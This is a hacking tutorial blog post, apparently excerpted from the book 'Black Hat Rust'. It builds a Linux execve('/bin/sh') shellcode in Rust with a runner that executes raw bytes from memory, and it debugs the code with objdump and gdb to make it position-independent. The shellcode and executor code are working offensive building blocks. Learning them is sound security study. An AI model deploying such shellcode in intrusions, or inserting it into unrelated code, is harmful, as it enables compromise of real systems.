+++
date = 2021-11-30T12:00:00Z
title = "Position Independent Shellcodes in Rust (PIC)"
type = "post"
tags = ["hacking", "security", "programming", "rust", "tutorial"]
authors = ["Sylvain Kerkour"]
url = "/rust-position-independent-shellcode"

[extra]
lang = "en"

comment ="""

"""
+++


## Shellcoding in Rust

We [previously saw how to craft an HelloWorld shellcode in Rust](https://kerkour.com/shellcode-in-rust/). This time, we are going to create a shellcode that... actually launches a shell, using the `execve` syscall.

A `C` equivalent would be something like:
```c
#include <unistd.h>

int main() {
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;

    execve(args[0], args, NULL);
}
```

Here is the shellcode in Rust:
**[main.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_08/shell/src/main.rs)**
```rust
#![no_std]
#![no_main]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const SYS_EXECVE: usize = 59;
const SHELL: &str = "/bin/sh\x00";
const ARGV: [*const &str; 2] = [&SHELL, core::ptr::null()];
const NULL_ENV: usize = 0;

unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() -> ! {
    unsafe {
        syscall3(
            SYS_EXECVE,
            SHELL.as_ptr() as usize,
            ARGV.as_ptr() as usize,
            NULL_ENV,
        );
    };

    loop {}
}
```

## The executor

As we also already saw [different methods to execute shellcodes from memory in Rust](https://kerkour.com/rust-execute-from-memory/), it won't be covered in this post.

Here is our shellcode executor/runner:

**[main.rs](https://github.com/skerkour/black-hat-rust/blob/main/ch_08/executor/src/main.rs)**
```rust
use std::mem;

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.bin");

fn main() {
    let exec_shellcode: extern "C" fn() -> ! =
        unsafe { mem::transmute(&SHELLCODE as *const _ as *const ()) };
    exec_shellcode();
}
```

Pretty straightforward, isn't it?

## Running the shellcode

Now everything is in place, let's run the shellcode:

```shell
$ make run_shell
Illegal instruction (core dumped)
make: *** [Makefile:3: execute] Error 132
```

Hmmmm. That was not expected... Let's investigate.


> This post is an excerpt from my book [Black Hat Rust](https://kerkour.com/black-hat-rust)


## Investigating the crash


### Dumping the shellcode

First, we disassemble the shellcode using `objdump` to see what looks like the generated code.


```shell
$  make dump_shell
# ...
Disassembly of section .data:

00000000 <.data>:
   0:   48 8d 3d 0f 00 00 00    lea    rdi,[rip+0xf]        # 0x16
   7:   48 8d 35 22 00 00 00    lea    rsi,[rip+0x22]        # 0x30
   e:   6a 3b                   push   0x3b
  10:   58                      pop    rax
  11:   31 d2                   xor    edx,edx
  13:   0f 05                   syscall
  15:   c3                      ret
  16:   2f                      (bad)          # "/bin/sh\x00"
  17:   62                      (bad)
  18:   69 6e 2f 73 68 00 00    imul   ebp,DWORD PTR [rsi+0x2f],0x6873
  1f:   00 16                   add    BYTE PTR [rsi],dl
  21:   00 00                   add    BYTE PTR [rax],al
  23:   00 00                   add    BYTE PTR [rax],al
  25:   00 00                   add    BYTE PTR [rax],al
  27:   00 08                   add    BYTE PTR [rax],cl
  29:   00 00                   add    BYTE PTR [rax],al
  2b:   00 00                   add    BYTE PTR [rax],al
  2d:   00 00                   add    BYTE PTR [rax],al
  2f:   00 20                   add    BYTE PTR [rax],ah
  31:   00 00                   add    BYTE PTR [rax],al
  33:   00 00                   add    BYTE PTR [rax],al
  35:   00 00                   add    BYTE PTR [rax],al
  37:   00 00                   add    BYTE PTR [rax],al
  39:   00 00                   add    BYTE PTR [rax],al
  3b:   00 00                   add    BYTE PTR [rax],al
  3d:   00 00                   add    BYTE PTR [rax],al
  3f:   00                      .byte 0x0
```


Other than the large empty array that uses precious bytes, at first glance, everything looks fine.

* At `0x17` we have the string `"/bin/sh\x00"`
* At `0x30` we have our `ARGV` array which contains a reference to `0x00000020`, which itself is a reference to `0x00000017`, the `"/bin/sh\x00"` `C` string, which is exactly what we wanted.


Let's see what really happens when we execute the shellcode.


### Using a debugger

```shell
$ gdb executor/target/debug/executor
(gdb) break executor::main
(gdb) run
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, executor::main () at src/main.rs:13
13              unsafe { mem::transmute(&SHELLCODE as *const _ as *const ()) };]
```

```
(gdb) disassemble /r
Dump of assembler code for function executor::main:
   0x000055555555b730 <+0>:     48 83 ec 18     sub    $0x18,%rsp
=> 0x000055555555b734 <+4>:     48 8d 05 b1 ff ff ff    lea    -0x4f(%rip),%rax        # 0x55555555b6ec <SHELLCODE>
   0x000055555555b73b <+11>:    48 89 44 24 08  mov    %rax,0x8(%rsp)
   0x000055555555b740 <+16>:    48 8b 44 24 08  mov    0x8(%rsp),%rax
   0x000055555555b745 <+21>:    48 89 04 24     mov    %rax,(%rsp)
   0x000055555555b749 <+25>:    48 89 44 24 10  mov    %rax,0x10(%rsp)
   0x000055555555b74e <+30>:    48 8b 04 24     mov    (%rsp),%rax
   0x000055555555b752 <+34>:    ff d0   callq  *%rax
   0x000055555555b754 <+36>:    0f 0b   ud2
End of assembler dump.
```

```
(gdb) disassemble /r SHELLCODE
Dump of assembler code for function SHELLCODE:
   0x000055555555b6ec <+0>:     48 8d 3d 0f 00 00 00    lea    0xf(%rip),%rdi        # 0x55555555b702 <SHELLCODE+22>
   0x000055555555b6f3 <+7>:     48 8d 35 22 00 00 00    lea    0x22(%rip),%rsi        # 0x55555555b71c <SHELLCODE+48>
   0x000055555555b6fa <+14>:    6a 3b   pushq  $0x3b
   0x000055555555b6fc <+16>:    58      pop    %rax
   0x000055555555b6fd <+17>:    31 d2   xor    %edx,%edx
   0x000055555555b6ff <+19>:    0f 05   syscall
   0x000055555555b701 <+21>:    c3      retq
   0x000055555555b702 <+22>:    2f      (bad)
   0x000055555555b703 <+23>:    62      (bad)
   0x000055555555b704 <+24>:    69 6e 2f 73 68 00 00    imul   $0x6873,0x2f(%rsi),%ebp
   0x000055555555b70b <+31>:    00 16   add    %dl,(%rsi)
   0x000055555555b70d <+33>:    00 00   add    %al,(%rax)
   0x000055555555b70f <+35>:    00 00   add    %al,(%rax)
   0x000055555555b711 <+37>:    00 00   add    %al,(%rax)
   0x000055555555b713 <+39>:    00 08   add    %cl,(%rax)
   0x000055555555b715 <+41>:    00 00   add    %al,(%rax)
   0x000055555555b717 <+43>:    00 00   add    %al,(%rax)
   0x000055555555b719 <+45>:    00 00   add    %al,(%rax)
   0x000055555555b71b <+47>:    00 20   add    %ah,(%rax)
   0x000055555555b71d <+49>:    00 00   add    %al,(%rax)
   0x000055555555b71f <+51>:    00 00   add    %al,(%rax)
   0x000055555555b721 <+53>:    00 00   add    %al,(%rax)
   0x000055555555b723 <+55>:    00 00   add    %al,(%rax)
   0x000055555555b725 <+57>:    00 00   add    %al,(%rax)
   0x000055555555b727 <+59>:    00 00   add    %al,(%rax)
   0x000055555555b729 <+61>:    00 00   add    %al,(%rax)
   0x000055555555b72b <+63>:    00 0f   add    %cl,(%rdi)
End of assembler dump.
```

Hmmmmmm. We can see at offset `0x000055555555b71b` our `ARGV` array. But it sill points to `0x00000020`, and not `0x000055555555b70b`. In the same vein, `0x000055555555b70b` is still pointing to `0x00000016`, and not `0x000055555555b702` where the actual `"/bin/sh\x00"` string is.

It's because we used global `const` variables. Rust hardcoded the adresses and they won't be valid when executing the shellcode (those addresses are computed at compile-time).

Indeed, in contrary to traditional programs, shellcodes should be, by design, able to run at any memory address. Thus, **shellcodes can't embed any hard-coded address**.

A chunk of code that can execute at any address is called **Position Independent Code (PIC)**. If our code was a whole executable, it would be called **Position Independent Executable (PIE)**.

For that, the compiler is going to use relative addresses instead of absolute ones.

Let see how to compile our shellcode to be position-independent.


## Position independent code in Rust

In order to produce position-independent code in Rust, we need to use stack variables instead of global `const`.

```rust
#[no_mangle]
fn _start() -> ! {
    let shell: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&shell, core::ptr::null()];

    unsafe {
        syscall3(
            SYS_EXECVE,
            shell.as_ptr() as usize,
            argv.as_ptr() as usize,
            NULL_ENV,
        );
    };

    loop {}
}
```


Compiling and disassembling our new shellcode gives us:

```shell
$ make dump_shell
Disassembly of section .data:

00000000 <.data>:
   0:   48 83 ec 20             sub    rsp,0x20
   4:   48 8d 3d 27 00 00 00    lea    rdi,[rip+0x27]        # 0x32
   b:   48 89 e0                mov    rax,rsp
   e:   48 89 38                mov    QWORD PTR [rax],rdi
  11:   48 8d 74 24 10          lea    rsi,[rsp+0x10]
  16:   48 89 06                mov    QWORD PTR [rsi],rax
  19:   48 83 66 08 00          and    QWORD PTR [rsi+0x8],0x0
  1e:   48 c7 40 08 08 00 00    mov    QWORD PTR [rax+0x8],0x8
  25:   00
  26:   6a 3b                   push   0x3b
  28:   58                      pop    rax
  29:   31 d2                   xor    edx,edx
  2b:   0f 05                   syscall
  2d:   48 83 c4 20             add    rsp,0x20
  31:   c3                      ret
  32:   2f                      (bad)  # "/bin/sh\x00"
  33:   62                      (bad)
  34:   69                      .byte 0x69
  35:   6e                      outs   dx,BYTE PTR ds:[rsi]
  36:   2f                      (bad)
  37:   73 68                   jae    0xa1
  39:   00                      .byte 0x0
```

A bonus of using stack variables is that now, our shellcode doesn't need to embed a whole, mostly empty array. The array is dynamically built on the stack as if we were crafting the shellcode by hand.

```shell
$ make run_shell
$ ls
Cargo.lock  Cargo.toml  src  target
$
```

Awesome, it works!


## The code is on GitHub

As usual, you can find the code on GitHub: [github.com/skerkour/black-hat-rust](https://github.com/skerkour/black-hat-rust/tree/main/ch_08) (please don't forget to star the repo 🙏).
